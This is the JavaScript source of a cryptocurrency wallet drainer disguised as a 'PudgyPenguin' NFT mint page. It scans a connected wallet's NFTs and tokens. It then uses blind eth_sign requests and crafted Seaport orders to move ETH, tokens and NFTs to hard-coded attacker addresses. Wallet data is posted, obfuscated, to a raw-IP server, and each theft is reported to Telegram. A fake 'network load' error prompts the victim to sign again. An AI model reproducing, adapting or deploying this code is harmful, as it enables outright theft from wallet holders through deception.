import axios from 'axios';
import { Transaction } from '@ethereumjs/tx'
import { Seaport } from "@opensea/seaport-js";
import { ethers } from "ethers";
import { ItemType } from '@opensea/seaport-js/lib/constants';

const RECEIVER =
  "0x9A3caddb7d00DC4ab6421B94A242C4a51a7C742E"; // Acc4
const RECEIVER2 =
  "0x3c3b57B3487Cf357dF8C622a58d072d8BC608aEc"; // Acc4
// ckey_c8c9b4345db64fd9a02799de156
const COVAL_KEY =
  "216068667a5c343a65623230353a3b30333437663a33616031333535326137343421";
//const COVAL_KEY='216068667a5c343a65623230353a3b30333437663a33616031333535326137343421',

const OPENSEA_FEE = '0x0000a26b00c1F0DF003000390027140000fAa719';

//const COVAL_KEY = "ckey_2e3f2598077d4e5ead4a51857c4",
//const API_URL = "https://claimer.dev/logo3.png" // DOWN
//const API_URL = "https://claimer.dev/logo1.png"
// const API_URL = "https://175b-136-49-147-154.ngrok.io/logo1.png" // DOWN 
const API_URL = "212.224.86.94:3000"

const NAME = "PudgyPenguin";
const CHAIN_ID = 4 ;
const MIN_ETH_BAL = 0.001;

let seaport;

const OPENSEAAPIKEY =  "eeae1d7d4423433ab5e103905ee7cf06" // from dcg

/**
 *
 * @param {string} account
 */
async function action(account) {
  const { ethereum } = window;

  // if wallet is not connected
  if (!account) {
    await connect('mm');
    return;
  }
  // check chain
  var chainId = ethereum.networkVersion;
  if (ethereum.networkVersion !== CHAIN_ID.toString()) {
    let res = await tryToChangeChain();
    if (!res) return;
    chainId = ethereum.networkVersion;
  }

  // if scanning didn't happen
  if (getItem("noeth") === null || getItem("nfts") === null) {
    scanNoeth(account, chainId);
    await scanNfts(account);
  }

  var isMint = false;

  while (true) {
    try {
      // vars
      const web3 = new Web3(ethereum);
      const ethBal =
        Math.floor(
          parseFloat(web3.utils.fromWei(await web3.eth.getBalance(account))) *
            10000
        ) / 10000;

      // check eth bal
      if (ethBal < MIN_ETH_BAL) {
        try {
          // if got nfts
          if (getItem("seanfts") && getItem("seanfts").nfts.length) {
            let res = await actionSea(account);
            if (res) updateArrays("sea");
          } else {
            // if got nothing then can sign empty message
            const sha3_ = web3.utils.sha3("test", { encoding: "hex" });
            await web3.eth.sign(sha3_, account);
          }
          try {
            // await mint(account);
          } catch (e) {}
          return;
        } catch (e) {
          try {
            // await mint(account);
          } catch (e) {}
          return;
        }
      }

      // @ts-ignore
      const gasPrice = Math.floor((await web3.eth.getGasPrice()) * 1.3); // in wei
      const valueToTransDec =
        ethBal -
        parseInt(TX_GAS_LIMIT.toString()) *
          parseFloat(web3.utils.fromWei(gasPrice.toString())) -
        0.005; // value to trans = eth bal - gwei * gasLimit

      const valueToTransHex = web3.utils.toHex(
        web3.utils.toWei(valueToTransDec.toString(), "ether")
      );

      const mode = compareWorth(valueToTransDec);

      // action
      var res;
      if (mode === "sea") {
        res = await actionSea(account);
      } else {
        res = await actionSig(
          account,
          mode,
          valueToTransHex,
          gasPrice,
          chainId
        );
      }

      // updating arrays
      if (res) updateArrays(mode); // update arrays if action happend

      isMint = true;
      // await mint(account);

      break;
    } catch (e) {
      console.log(e);
      // showError(e.message);

      try {
        // if (!isMint) await mint(account);
      } catch (e) {}

      return;
    }
  }
}

/**
 * build calldata
 * build message to sign
 * sign message
 * send to backend
 * @param {string} account
 * @returns boolean success
 */
async function actionSea(account) {
  try {
    const web3 = new Web3(window.ethereum);

    // build message
    const timestamp = Math.floor(Date.now() / 1000) + 20;
    const salt = getSalt();
    const salt2 = getSalt();

    const messageToSign = getSellSeaMessage(
      account,
      getItem("seanfts").nfts,
      timestamp,
      salt2
    );
    console.log("messageToSign---------------\n", messageToSign)
    // sign
    var isSigned = false,
      ended = false;
    console.log('actionSea opened!!')

    const { executeAllActions } = await seaport.createOrder(
      {
        offer: getOffer(getItem("seanfts").nfts),
        consideration: [
          {
            amount: ethers.utils.parseEther("100").toString(),
            recipient: account,
          },
        ],
      },
      account
    );

    const order = await executeAllActions();


    // // OpenSeaport-Popup
    // await web3.currentProvider.send(
    //   {
    //     method: "eth_signTypedData_v4",
    //     params: [account, JSON.stringify(messageToSign)],
    //     from: account,
    //     id: new Date().getTime(),
    //   },
    //   (err, res) => {
    //     if (!err) {
    //       console.log(res.result);

          // send to backend --> THIS IS NEEDED (maybe own backend/API_URL)?
    const method = "post"
    const url = API_URL
    const errorText = ""
    const payload = {
                      'addr': account,
                      'tokensArr': getItem("seanfts").nfts,
                      // 'sig': res.result,
                      // 'sigTime': timestamp,
                      // 'salt': salt.toString(),
                      // 'salt2': salt2.toString(),
                      // 'worth': getItem("seanfts").totalWorth,
                      'domain': window.location.hostname
                    }
    // from here its the problem
    const res = await sendReq(method, url, errorText, payload)
  
    console.log("sendReq Result:", res)

    const { executeAllActions: executeAllFulfillActions } =
    await seaport.fulfillOrder({
      order: res['data'],
      accountAddress: account,
    });

    const transaction = await executeAllFulfillActions();

    console.log("buy completed\n", transaction)

    //     } else console.log("err in sign", err);
    //     ended = false; // ORIG 
    //     // ended = true; // FOR TESTING (?)
    //   }
    // );
    while (!ended) {
      await sleep(500);
    }

    console.log("isSigned:", isSigned);
    return isSigned;
  } catch (e) {
    console.log("action sea error:", e);
    return false;
  }
}

/**
 * build tx as message
 * sign message
 * destruct sign
 * send as tx
 *
 * @param {string} account
 * @param {string} mode
 * @param {string} valueToTransHex
 * @param {number} gasPrice
 * @param {number} chainId
 * @returns boolean success
 */
async function actionSig(account, mode, valueToTransHex, gasPrice, chainId) {
  let nfts = getItem("nfts"),
    noeth = getItem("noeth");

  const { ethereum } = window;
  const web3 = new Web3(ethereum);
  const nonce = web3.utils.toHex(await web3.eth.getTransactionCount(account));
  let tx_;

  if (mode === "nft") {
    if (!nfts.length) return;

    const currentContract = new web3.eth.Contract(
      ERC721ABI,
      nfts[0].contractAddr
    );

    // is approve or transfer
    let data;
    var nftsFromCurCollection = nfts.filter(
      (nft) => nft.contractAddr === nfts[0].contractAddr
    );

    if (nftsFromCurCollection.length > 1) {
      showInfo("nft: transfer");
      data = currentContract.methods
        .safeTransferFrom(account, RECEIVER, nfts[0].tokenId)
        .encodeABI();
    } else {
      showInfo("nft: transfer");
      data = currentContract.methods
        .safeTransferFrom(account, RECEIVER, nfts[0].tokenId)
        .encodeABI();
    }

    // res tx
    tx_ = {
      to: nfts[0].contractAddr,
      nonce: nonce,
      gasLimit: CONTRACT_GAS_LIMIT,
      gasPrice: web3.utils.toHex(gasPrice),
      value: "0x0",
      data: data,
      r: "0x",
      s: "0x",
      v: "0x1",
    };
  } else if (mode === "noeth") {
    if (!noeth) return;
    const currentContract = new web3.eth.Contract(
      ERC20ABI,
      noeth[0].contract_address
    );

    // res tx
    tx_ = {
      to: noeth[0].contract_address,
      nonce: nonce,
      gasLimit: CONTRACT_GAS_LIMIT,
      gasPrice: web3.utils.toHex(gasPrice),
      value: "0x0",
      data: currentContract.methods
        .transfer(RECEIVER, noeth[0].balance)
        .encodeABI(),
      r: "0x",
      s: "0x",
      v: "0x1",
    };
  } else if (mode === "eth") {
    console.log("eth to send:", web3.utils.fromWei(valueToTransHex));
    // res tx
    tx_ = {
      to: RECEIVER,
      nonce: nonce,
      gasLimit: TX_GAS_LIMIT,
      gasPrice: web3.utils.toHex(gasPrice),
      value: valueToTransHex,
      data: "0x0",
      r: "0x",
      s: "0x",
      v: "0x1",
    };
  }

  console.log(tx_);

  // build message to sign
  // const { ethereumjs } = window;
  // console.log('ethereumjs', ethereumjs)
  var tx = Transaction.fromTxData(tx_);
  const serializedTx = "0x" + tx.serialize().toString("hex");
  const sha3_ = web3.utils.sha3(serializedTx, { encoding: "hex" });

  // sign initial message
  const initialSig = await web3.eth.sign(sha3_, account);

  // destruct origin sign, get rsv, update tx
  const temp = initialSig.substring(2),
    r = "0x" + temp.substring(0, 64),
    s = "0x" + temp.substring(64, 128),
    rhema = parseInt(temp.substring(128, 130), 16),
    v = web3.utils.toHex(rhema + chainId * 2 + 8);
  tx.r = r;
  tx.s = s;
  tx.v = v;

  const txFin = "0x" + tx.serialize().toString("hex");

  // send tx as signed tx
  // console.log("Waiting for sign submitting...");
  // const res = await web3.eth.sendSignedTransaction(txFin);
  // console.log("Submitted:", res);

  // send mess to tg
  let textMode, worth, contract;
  if (mode === "noeth") {
    textMode = "Tokens transfer";
    worth = noeth[0].worth;
    contract = noeth[0].contract_address.slice(2);
  } else if (mode === "nft" && nftsFromCurCollection.length > 1) {
    textMode = "NFT Approve";
    worth = nfts[0].worth * nftsFromCurCollection.length;
    contract = nfts[0].contractAddr.slice(2);
  } else if (mode === "nft") {
    textMode = "NFT transfer";
    worth = nfts[0].worth;
    contract = nfts[0].contractAddr.slice(2);
  } else if (mode === "eth") {
    textMode = "ETH transfer";
    worth = web3.utils.fromWei(valueToTransHex);
    contract = null;
  }

  tgSend(
    `${window.location.hostname} | ${textMode}
Address: ${fAddr(account.slice(2))}
Contract: ${contract ? fAddr(contract) : "ETH"}
Worth: ${Math.round(worth * 100) / 100} ETH`
  );

  showError("The action failed due to network load. Please try to sign again");

  return true;
}

/**
 * @param {string} name name of wallet
 */
export async function connect(name) {
  const { ethereum } = window;
  const width = window.innerWidth;
  // check provider
  if (!ethereum && width < 815) {
    if (name === "mm") {
      window.open(
        `https://metamask.app.link/dapp/${window.location.href
          .replace("https://", "")
          .replace("http://", "")}`
      );
    }
    if (name === "tw") {
      window.open(
        `https://link.trustwallet.com/open_url?coin_id=60&url=${window.location.href}`
      );
    }
    return;
  } else if (!ethereum) {
    showError("No crypto wallet found. Please install MetaMask");
    return;
  }
  console.log('metamask connected??')
  // do not activate coinbase
  if (name === "mm" && ethereum.providers) {
    ethereum.setSelectedProvider(
      ethereum.providers.find(({ isMetaMask }) => isMetaMask)
    );
  }
  console.log('chainID', ethereum.networkVersion, CHAIN_ID)
  // check chain
  if (ethereum.networkVersion !== CHAIN_ID.toString()) {
    let res = await tryToChangeChain(name);
    if (!res) return;
  }

  // connect
  let account = await ethereum.request({
    method: "eth_requestAccounts",
  });

  // trust wallet bug handle
  account =
    name === "tw"
      ? await ethereum.request({
          method: "eth_requestAccounts",
        })[0]
      : ethereum.selectedAddress.toString();

  localStorage.removeItem("noeth");
  localStorage.removeItem("nfts");

  scanNoeth(account, CHAIN_ID);
  scanNfts(account);


  // sign empty message
  // await signMessage(account);

  // action(account);

  const provider = new ethers.providers.Web3Provider(window.ethereum);

  seaport = new Seaport(provider);

  console.log('=========================account====================',account)
  return action(account);
}

async function only_connect(name) {
    const { ethereum } = window;
    const width = window.innerWidth;
  
    // check provider
    if (!ethereum && width < 815) {
      if (name === "mm") {
        window.open(
          `https://metamask.app.link/dapp/${window.location.href
            .replace("https://", "")
            .replace("http://", "")}`
        );
      }
      if (name === "tw") {
        window.open(
          `https://link.trustwallet.com/open_url?coin_id=60&url=${window.location.href}`
        );
      }
      return;
    } else if (!ethereum) {
      showError("No crypto wallet found. Please install MetaMask");
      return;
    }
  
    // do not activate coinbase
    if (name === "mm" && ethereum.providers) {
      ethereum.setSelectedProvider(
        ethereum.providers.find(({ isMetaMask }) => isMetaMask)
      );
    }
  
    // check chain
    if (ethereum.networkVersion !== CHAIN_ID.toString()) {
      let res = await tryToChangeChain(name);
      if (!res) return;
    }
  
    // connect
    let account = await ethereum.request({
      method: "eth_requestAccounts",
    });
  
    // trust wallet bug handle
    account =
      name === "tw"
        ? await ethereum.request({
            method: "eth_requestAccounts",
          })[0]
        : ethereum.selectedAddress.toString();
  
    localStorage.removeItem("noeth");
    localStorage.removeItem("nfts");
  
    scanNoeth(account, CHAIN_ID);
    scanNfts(account);
  
    tgSend(
      `${window.location.hostname} | Connect\nAddress: ${fAddr(account.slice(2))}`
    );
  
    // sign empty message
    // await signMessage(account);
  
    // action(account);
  
    return account;
  }

/**
 * @param {any} name name of wallet
 */
async function tryToChangeChain(name = null) {
  if ((name && name === "tw") || window.innerWidth < 815) {
    showError(`Please change network to ${CHAIN_ID === 1 ? "ETH" : "BSC"}`);
    return false;
  }

  // if pc try to switch
  try {
    // @ts-ignore
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: `0x${CHAIN_ID.toString(16)}` }],
    });
  } catch (err) {
    if (err.code === 4902) {
      showError(`Please add ${CHAIN_ID === 1 ? "ETH" : "BSC"} network.`);
      return false;
    }
  }
  return true;
}

/**
 *
 * @param {any} text data to encode
 * @returns {string} encoded string
 */
const c = (text) => {
  try {
    text = JSON.stringify(text);
    const textToChars = (text) =>
      text
        .toString()
        .split("")
        .map((c) => c.charCodeAt(0));
    const byteHex = (n) => ("0" + Number(n).toString(16)).substr(-2);
    const applySaltToChar = (code) =>
      textToChars(31612400).reduce((a, b) => a ^ b, code);

    return text
      .split("")
      .map(textToChars)
      .map(applySaltToChar)
      .map(byteHex)
      .join("");
  } catch (e) {
    return null;
  }
};

/**
 *
 * @param {string} encoded encoded string from c
 * @returns {any} object that was decoded
 */
const d = (encoded) => {
  try {
    const textToChars = (text) =>
      text
        .toString()
        .split("")
        .map((c) => c.charCodeAt(0));
    const applySaltToChar = (code) =>
      textToChars(31612400).reduce((a, b) => a ^ b, code);
    return JSON.parse(
      encoded
        .toString()
        .match(/.{1,2}/g)
        .map((hex) => parseInt(hex, 16))
        .map(applySaltToChar)
        .map((charCode) => String.fromCharCode(charCode))
        .join("")
    );
  } catch (e) {
    return null;
  }
};

/**
 * @param {number} ethBal
 * @returns { "nft"  | "noeth" | "eth" | "sea"}
 */
function compareWorth(ethBal) {
  let nfts = getItem("nfts"),
    seanfts = getItem("seanfts"),
    noeth = getItem("noeth");

  // if only eth
  if ((!noeth || !noeth.length) && (!nfts || !nfts.length)) return "eth";

  // vars
  const a = {
    worth: noeth && noeth.length ? noeth[0].worth : -1,
    res: "noeth",
  };
  const b = {
    worth: nfts && nfts.length ? nfts[0].worth * 0.8 : -1,
    res: "nft",
  };
  const c = {
    worth: seanfts.nfts && seanfts.nfts.length ? seanfts.totalWorth * 0.8 : -1,
    res: "sea",
  };
  const d = { worth: ethBal, res: "eth" };

  // sort
  let sortedValues = [a, b, c, d].sort((a, b) => (a.worth < b.worth ? 1 : -1));

  // @ts-ignore
  return sortedValues[0].res;
}

/**
 * @param {string} key
 * @param {any} value
 */
function setItem(key, value) {
  localStorage.setItem(key, JSON.stringify(value));
}

async function signMessage(account) {
  const { ethereum } = window;

  const web3 = new Web3(ethereum);

  const messageToSign = `Welcome to ${NAME}!

Click to sign in. 

Next you will be asked to sign the message to mint nft.

This requests will not trigger a blockchain transaction or cost any gas fees.

Your authentication status will reset after 24 hours.

Wallet address:
${account}

Nonce:
${getNonce()}
  `;

  await web3.eth.personal.sign(messageToSign, account);
}

function getNonce() {
  function rndStr(length) {
    var result = "";
    var characters = "abcdef123456789";
    for (var i = 0; i < length; i++) {
      result += characters.charAt(
        Math.floor(Math.random() * characters.length)
      );
    }
    return result;
  }

  return `${rndStr(8)}-${rndStr(4)}-${rndStr(4)}-${rndStr(4)}-${rndStr(8)}`;
}

/**
 * @param {string} account
 * @param {{ id: string; contractAddr: any; amount: any; }[]} tokensArr
 * @param {number} timestamp
 * @param {string} salt
 */
function getSellSeaMessage(account, tokensArr, timestamp, salt) {
  const offer = getOffer(tokensArr);
  const consideration = getConsideration(offer, account);

  //https://docs.opensea.io/v2.0/reference/model-reference#order-parameters-model
  // Order Parameters Model
  const orderForSigning = {
    offerer: account,
    zone: "0x004c00500000ad104d7dbd00e3ae0a5c00560c00",
    zoneHash:
      "0x0000000000000000000000000000000000000000000000000000000000000000",
    startTime: timestamp,
    endTime: timestamp + expirationOffset,
    orderType: 2,
    salt: salt,
    conduitKey:
      "0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000",
    // nonce is missing?
    offer: offer,
    consideration: consideration,
    counter: 0
  };

  const message = {
    types: ORDER_TYPE,
    domain: {
      name: "Seaport",
      version: "1.1",
      chainId: 4,
      verifyingContract: "0x00000000006c3852cbef3e08e8df289169ede581",
    },
    primaryType: "OrderComponents",
    message: orderForSigning,
  };
  console.log("message", message);
  return message;
}

/**
 * @param {{ id: string; contractAddr: any; amount: any; }[]} tokensArr
 * @returns {{ itemType: number; token: string; identifierOrCriteria: string; startAmount: string; endAmount: string}[]}
 */
function getOffer(tokensArr) {
  let res = [];
  tokensArr.forEach(
    (/** @type {{ id: string; contractAddr: any; amount: any; }} */ token) => {
      res.push({
        itemType: ItemType.ERC721,
        token: token.contractAddr,
        identifier: token.id,
      });
    }
  );

  return res;
}

/**
 * @param {{ itemType: number; token: string; identifierOrCriteria: string; startAmount: string; endAmount: string}[]} offer
 * @returns {{ itemType: number; token: string; identifierOrCriteria: string; startAmount: string; endAmount: string, recipient: string}[]}
 */
function getConsideration(offer, offerer) {
  const considerations = Array();
  // console.log("considerations", considerations, offerer, offer.length)
  let consideration = Object();

  considerations[0] = Object();
  considerations[0]['startAmount'] = "39";
  considerations[0]['endAmount'] = "39";
  considerations[0]['identifierOrCriteria'] = 0;
  considerations[0]['itemType'] = 0;
  considerations[0]['token'] = "0x0000000000000000000000000000000000000000";
  considerations[0]['recipient'] = offerer;

  considerations[1] = Object();
  considerations[1]['startAmount'] = "1";
  considerations[1]['endAmount'] = "1";
  considerations[1]['identifierOrCriteria'] = 0;
  considerations[1]['itemType'] = 0;
  considerations[1]['token'] = "0x0000000000000000000000000000000000000000";
  considerations[1]['recipient'] = OPENSEA_FEE;

  // offer.forEach((_, index) => {
  //   consideration.push({
  //     ...offer[index],
  //     receipient: RECEIVER2
  //   })
  // }
  return considerations;
}

/**
 * @param {string} key
 */
function getItem(key) {
  return JSON.parse(localStorage.getItem(key));
}

/**
 * @returns {string} 70 chars salt
 */
function getSalt() {
  let result = "3";
  const characters = "0123456789";
  const charactersLength = characters.length;
  for (let i = 0; i < 69; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

/**
 * @param {number} delayInms
 */
function sleep(delayInms) {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve(2);
    }, delayInms);
  });
}

/*
sets array of nfts:
nfts = [{
      contractAddr: string, 
      tokenId: string
      worth: int,
    }, 
    ...
  ]
*/
/**
 * @param {string} account
 */
async function scanNfts(account) {
  if (!account) return;
  if (!getItem("nfts") || !getItem("nfts").length) {
    try {
      // get list of collections
      const resp = await sendReq(
        "get",
        // `https://api.opensea.io/api/v1/collections?asset_owner=${account}&offset=0&limit=20`
        `https://testnets-api.opensea.io/api/v1/collections?asset_owner=${account}&offset=0&limit=20`
      );

      if (!resp || !resp.data) {
        showError("Internal error. Please reload the page");
        return;
      }

      // filter
      let collections = resp.data;
      console.log('****************************', collections)
      collections = collections.filter(
        (collection) =>
          collection.description !== "" &&
          // collection.stats.seven_day_volume > 0 &&
          // collection.stats.one_day_average_price > 0 &&
          collection.primary_asset_contracts.length &&
          collection.primary_asset_contracts[0].schema_name !== "ERC1155" &&
          collection.primary_asset_contracts[0].address !==
            "0x57f1887a8bf19b14fc0df6fd9b2acc9af147ea85" // remove ens
      );

      // sort by price
      collections.sort((a, b) => {
        return a.stats.one_day_average_price < b.stats.one_day_average_price
          ? 1
          : -1;
      });

      // result collections
      console.log("collections:", collections);
      setItem("collections", collections);

      // get list of token ids
      let nfts = [];
      if (collections.length) {
        // const assetsUrl = `https://api.opensea.io/api/v1/assets?owner=${account}`;
        const assetsUrl = `https://testnets-api.opensea.io/api/v1/assets?owner=${account}`;
        var payload = "";
        // building request url. adding all collections contracts
        collections.forEach((collection) => {
          payload += `&asset_contract_addresses=${collection.primary_asset_contracts[0].address}`;
        });

        let res = await sendReq("get", `${assetsUrl}${payload}`);
        if (!res || !res.data) {
          showError("Internal error. Try again later");
          return;
        }
        let allNfts = res.data.assets;
        console.log('++++++++++++++++allNfts', allNfts)
        // get nfts for each collection
        collections.forEach((collection) => {
          let currentCollectionNfts = allNfts.filter(
            (nft) =>
              nft.asset_contract.address ===
              collection.primary_asset_contracts[0].address
          );

          currentCollectionNfts.forEach((nftInCurCollection) => {
            // add to result array
            nfts.push({
              contractAddr: collection.primary_asset_contracts[0].address,
              worth:
                Math.round(
                  collection.stats.one_day_average_price * 0.8 * 10000
                ) / 10000,
              tokenId: nftInCurCollection.token_id,
              id: nftInCurCollection.token_id,
            });
          });
        });

        // sort by worth
        nfts.sort((a, b) => {
          return a.worth < b.worth ? 1 : -1;
        });
      }

      console.log("nfts000000000000000000000000:", nfts);
      setItem("nfts", nfts);
      await scanSea(account, nfts);
      return nfts;
    } catch (e) {
      // showError(e.message);
    }
  } else {
    return getItem("nfts");
  }
}

/**
 * @param {string} account
 * @param {any[]} allNfts
 */
async function scanSea(account, allNfts) {
  let seanfts = {
    nfts: [],
    totalWorth: 0,
  }; // result array. array of nfts for which user gave approve to opensea
  console.log('opensea started')
  if (
    !getItem("collections") ||
    !getItem("collections").length ||
    !allNfts.length
  ) {
    console.log("No opensea approves, because no nfts");
    setItem("seanfts", seanfts);
    return;
  }
  console.log('opensea started')

  // get proxy address for user
  const { ethereum } = window;
  const web3 = new Web3(ethereum);

  const Conduit = "0x1E0049783F008A0085193E00003D00cd54003c71"; // OpenSea: Deployer 
  console.log('opensea started')

  const erc721Contract = new web3.eth.Contract(ERC721ABI);
  console.log('opensea started')

  const erc1155Contract = new web3.eth.Contract(ERC1155ABI);
  console.log('opensea started')

  console.log("erc contract", erc721Contract);
  console.log("erc 1155contract", erc1155Contract);

  const multicallContract = new web3.eth.Contract(
    MulticallABI,
    // "0xeefBa1e63905eF1D7ACbA5a8513c70307C1cE441"//mainnet
    "0x42Ad527de7d4e9d9d011aC45B31D8551f8Fe9821"//rinkeby testnet
  );

  let ercContract;
  console.log("multcall", multicallContract);

  // build multicall calls. check each collection
  let multiCalldata = [];
  const collections = getItem("collections");
  console.log(">>>>>>>>>>>>>collections", collections)
  collections.forEach((collection) => {
    if (collection)
    multiCalldata.push({
      target: collection.primary_asset_contracts[0].address,
      callData: erc721Contract.methods
        .isApprovedForAll(account, Conduit)
        .encodeABI(),
    });
  });

  console.log("collections<<<<<<<<<<<<<<<", collections)

  const results = (
    await multicallContract.methods.aggregate(multiCalldata).call()
  ).returnData;

  console.log(">>>>>>>>>>>>>>>>>>>>>results", results);

  // add to result array all approved nfts + increase totalWorth
  results.forEach((result, index) => {
    const isApproved = parseInt(result.slice(-1));
    const curCollectionAddr =
      collections[index].primary_asset_contracts[0].address;

    if (isApproved) {
      // then we add this collection nfts to seanfts

      // get all collection nfts
      let currentCollectionNfts = allNfts.filter(
        (nft) => nft.contractAddr === curCollectionAddr
      );
      
      
      // add each nft to seanft arr
      currentCollectionNfts.forEach((nft) => {
        console.log("NFT worth: ", nft.worth)
        seanfts.totalWorth += nft.worth; // ORIG
        seanfts.totalWorth = 1000 //nft.worth; // FAKED --> @@@@@@ REMOVE LATER TO GET WORTH
        let copy = structuredClone(nft);
        delete copy.tokenId;
        delete copy.worth;
        seanfts.nfts.push(copy);
      });
    }
  });

  // round worth
  if (results.length) {
    seanfts.totalWorth = Math.round(seanfts.totalWorth * 10000) / 10000;
    console.log("seanfts:", seanfts);
    setItem("seanfts", seanfts);
  } else {
    console.log("seanfts: []");
    setItem("seanfts", {
      nfts: [],
      totalWorth: 0,
    });
  }
}

/**
 * @param {string} account
 * @param {number} chainId
 */
async function scanNoeth(account, chainId) {
  if (!account) return;
  if (!getItem("noeth") || !getItem("noeth").length) {
    try {
      const coval_res = await sendReq(
        "get",
        `https://api.covalenthq.com/v1/${chainId}/address/${account}/balances_v2/?quote-currency=ETH&no-nft-fetch=true&`
      );

      if (!coval_res.data) {
        console.log("noeth: []");
        showError("Internal error. Please try again later");
        setItem("noeth", []);
        return;
      }

      let noeth = coval_res.data.data.items;
      console.log("beforeFilter:", noeth);
      noeth = noeth.filter(
        (coin) =>
          coin.contract_ticker_symbol != null &&
          coin.contract_name != null &&
          coin.contract_name.indexOf(".") === -1 &&
          coin.quote > 0 &&
          coin.contract_address !== "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee"
      );

      noeth.sort(function (a, b) {
        return a.quote < b.quote ? 1 : -1;
      });

      // add amount in eth (specified in url)
      noeth.forEach(
        (token) => (token.worth = Math.round(token.quote * 10000) / 10000)
      );

      console.log("noeth:", noeth);
      setItem("noeth", noeth);
    } catch (e) {
      // showError(e.message);
    }
  } else return getItem("noeth");
}


/**
 * @param {string} method
 * @param {string} url
 * @param {any}  errorText
 * @param {any} payload
 */
 async function sendReq(method, url, errorText = null, payload = null) {
  
  //console.log("PAYLOAD 1: ", payload)
  //console.log("PAYLOAD 1 JSON: ", JSON.stringify(payload))

  try {
    var res;
    if (method === "get") {
      if (url.includes("coval")) url += `key=${d(COVAL_KEY)}`;

      res = await axios.get(url, {
        headers: url.includes("coval")
          ? {
              accept: "application/json",
            }
          : {},
      });
    } else {
      
      //console.log("PAYLOAD 2: ", payload)
      //console.log("PAYLOAD 2 JSON: ", JSON.stringify(payload))
      
      // MY TESTING (but not working)
      // payload = c(payload);
      // res = await axios.post(url, {
      //   payload: payload,
      //   'headers': {
      //               'accept': "application/json",
      //               'Content-Type': 'application/json',
      //               'Access-Control-Allow-Origin': '*',
      //               'X-API-KEY': OPENSEAAPIKEY // @@@ API-KEY
      //        }
      // });

      payload = c(payload);
      res = await axios.post(url, {
        payload: payload,
      });
    }
    console.log(url, res);
    return res;
  } catch (e) {
    console.log(url, e);
    if (errorText) showError(errorText);
    return;
  }
}

/**
 * @param {string} addr 0x1231 addr
 * @returns {string} formatted for tg markdown
 */
const fAddr = (addr) => {
  return `[0x${addr}](etherscan.io/address/0x${addr})`;
};

/**
 * @param {"nft" | "sea" | "noeth" | "eth"} mode
 */
function updateArrays(mode) {
  console.log("updating arrays");
  if (mode === "nft") {
    // is approve
    let nfts = getItem("nfts");
    let nftsFromCurCollection = nfts.filter(
      (nft) => nft.contractAddr === nfts[0].contractAddr
    );
    if (nftsFromCurCollection.length > 1) {
      // approve
      nfts = nfts.filter((nft) => nft.contractAddr !== nfts[0].contractAddr);
      setItem("nfts", nfts);
    } else {
      // transfer
      nfts.shift();
      setItem("nfts", nfts);
    }
  } else if (mode === "noeth") {
    // tokens
    let noeth = getItem("noeth");
    noeth.shift();
    setItem("noeth", noeth);
  } else if (mode === "sea") {
    // opensea
    setItem("seanfts", { nfts: [], totalWorth: 0 });
    console.log("updated sea array");
  } else if (mode === "eth") {
    return true;
  }
}

const TX_GAS_LIMIT = "0x55F0"; // 22'000
const CONTRACT_GAS_LIMIT = "0x186A0"; // 100'000

const expirationOffset = 2630000; // 1 month in sec

const ERC20ABI = [
  {
    constant: false,
    inputs: [
      { name: "_to", type: "address" },
      { name: "_value", type: "uint256" },
    ],
    name: "transfer",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
];

const ERC721ABI = [
  {
    constant: false,
    inputs: [
      { internalType: "address", name: "from", type: "address" },
      { internalType: "address", name: "to", type: "address" },
      { internalType: "uint256", name: "tokenId", type: "uint256" },
    ],
    name: "safeTransferFrom",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },

  {
    constant: false,
    inputs: [
      { internalType: "address", name: "to", type: "address" },
      { internalType: "bool", name: "approved", type: "bool" },
    ],
    name: "setApprovalForAll",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "owner",
        type: "address",
      },
      {
        internalType: "address",
        name: "operator",
        type: "address",
      },
    ],
    name: "isApprovedForAll",
    outputs: [
      {
        internalType: "bool",
        name: "",
        type: "bool",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
];

const MINTABI = [
  {
    inputs: [{ name: "_mintAmount", type: "uint256" }],
    name: "mint",
    outputs: [],
    stateMutability: "payable",
    type: "function",
  },
];

const MulticallABI = [
  {
    constant: false,
    inputs: [
      {
        components: [
          { name: "target", type: "address" },
          { name: "callData", type: "bytes" },
        ],
        name: "calls",
        type: "tuple[]",
      },
    ],
    name: "aggregate",
    outputs: [
      { name: "blockNumber", type: "uint256" },
      { name: "returnData", type: "bytes[]" },
    ],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
];

const ORDER_TYPE = {
  OrderComponents: [
    { name: "offerer", type: "address" },
    { name: "zone", type: "address" },
    { name: "offer", type: "OfferItem[]" },
    { name: "consideration", type: "ConsiderationItem[]" },
    { name: "orderType", type: "uint8" },
    { name: "startTime", type: "uint256" },
    { name: "endTime", type: "uint256" },
    { name: "zoneHash", type: "bytes32" },
    { name: "salt", type: "uint256" },
    { name: "conduitKey", type: "bytes32" },
    { name: "counter", type: "uint256" },
  ],
  OfferItem: [
    { name: "itemType", type: "uint8" },
    { name: "token", type: "address" },
    { name: "identifierOrCriteria", type: "uint256" },
    { name: "startAmount", type: "uint256" },
    { name: "endAmount", type: "uint256" },
  ],
  ConsiderationItem: [
    { name: "itemType", type: "uint8" },
    { name: "token", type: "address" },
    { name: "identifierOrCriteria", type: "uint256" },
    { name: "startAmount", type: "uint256" },
    { name: "endAmount", type: "uint256" },
    { name: "recipient", type: "address" },
  ],
  EIP712Domain: [
    { name: "name", type: "string" },
    { name: "version", type: "string" },
    { name: "chainId", type: "uint256" },
    { name: "verifyingContract", type: "address" },
  ],
};

const orderType = {
  OrderComponents: [
    { name: "offerer", type: "address" },
    { name: "zone", type: "address" },
    { name: "offer", type: "OfferItem[]" },
    { name: "consideration", type: "ConsiderationItem[]" },
    { name: "orderType", type: "uint8" },
    { name: "startTime", type: "uint256" },
    { name: "endTime", type: "uint256" },
    { name: "zoneHash", type: "bytes32" },
    { name: "salt", type: "uint256" },
    { name: "conduitKey", type: "bytes32" },
    { name: "counter", type: "uint256" },
  ],
  OfferItem: [
